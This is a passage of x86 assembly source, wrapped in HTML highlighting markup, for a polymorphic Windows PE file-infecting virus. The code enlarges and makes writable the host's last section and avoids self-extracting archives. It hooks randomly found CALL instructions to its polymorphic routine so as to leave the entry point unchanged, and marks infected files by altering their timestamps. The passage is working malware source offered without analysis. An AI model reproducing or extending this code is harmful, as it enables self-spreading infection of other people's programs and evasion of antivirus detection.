             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; it should be a code section</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">test</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">20000000</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Code_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0400</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Code_RVA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Code_Offset</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; edi contains the last section offset</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
             </span><span class="sc6">mul</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; calculate the Poly routine start address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">ImageBase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;   section address</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; last section new size = file size - last section physical offset + 2000</span><span class="sc0">
</span><span class="sc1">; it must be a multiple of 1000h, as it will be added to the image size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">test</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000FFF</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AlignOk</span><span class="sc0">

             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFF000</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc5">AlignOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">VirusAddress</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">LastSSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc0">                    </span><span class="sc1">; + 120h max</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">GarbageSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IDATSize</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Hooker</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus should better not infect self-extracting programs,</span><span class="sc0">
</span><span class="sc1">; especially WinZip ones, as most of them have a self-intergrity</span><span class="sc0">
</span><span class="sc1">; check.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; A program is considered as a self-extracting one if :</span><span class="sc0">
</span><span class="sc1">; (FileSize - (FileSize) / 16) &gt;= Last Section Physical End</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Normally, FileSize / 16 represents the debug information size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">clc</span><span class="sc0">
             </span><span class="sc6">shr</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">; - File Size / 16</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; - Physical Offset</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; - Raw Size</span><span class="sc0">
             </span><span class="sc6">jnc</span><span class="sc0">          </span><span class="sc5">ExitInfect</span><span class="sc0">             

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; increase the image size, the last section size and make it writable</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">LastSSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0C</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">80000000</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">VirusOffset</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; everything seems to be ok. so we can start the memory projection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                        </span><span class="sc1">; lpName</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; dwMaximumSizeLow</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                        </span><span class="sc1">; dwMaximumSizeHigh</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">04</span><span class="sc0">                        </span><span class="sc1">; Read/Write</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                        </span><span class="sc1">; lpFileMappingAttributes</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateFileMappingA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                        </span><span class="sc1">; dwNumberOfBytesToMap</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                        </span><span class="sc1">; FileOffsetLow</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                        </span><span class="sc1">; FileOffsetHigh</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">                        </span><span class="sc1">; dwDesiredAccess</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; hMapFile</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">MapViewOfFile</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ExitMapping</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">MapBase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; now write the header</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">800</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Here comes the tricky part. The virus won't modify the host</span><span class="sc0">
</span><span class="sc1">; EntryPoint, but it will roam through the code in order to</span><span class="sc0">
</span><span class="sc1">; find (NbHooks) call XXX and hook them to the polymorphic routine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Tries</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc5">NbHooks</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostCalls</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">Hook1Call</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; get a random location in the code section</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetRandNb</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Code_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400</span><span class="sc0">
             </span><span class="sc6">mul</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">div</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Code_Loc</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; start searching for the call opcode (0E8) </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Code_Offset</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">MapBase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">Find1Call</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Found1</span><span class="sc0">

</span><span class="sc5">Invalid</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">Find1Call</span><span class="sc0">

</span><span class="sc5">NextCall</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B0</span><span class="sc0">
</span><span class="sc5">Tries</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Tries</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ThatsEnough</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Hook1Call</span><span class="sc0">

</span><span class="sc5">Found1</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Invalid</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Code_Loc</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Code_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">jnc</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Invalid</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Code_RVA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ImageBase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
             </span><span class="sc6">neg</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Hooker</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextCall</span><span class="sc0">

</span><span class="sc5">ThatsEnough</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetPolyRoutine</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">MapBase</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">ExitMapping</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lclose</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; mark the program as infected</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the virus changes the seconds of creation so that :</span><span class="sc0">
</span><span class="sc1">; (seconds and 0F) xor (days and 0F) = mask (current month)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ExitInfect</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">FileDate</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; cl = days</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">SelF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; al = seconds</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

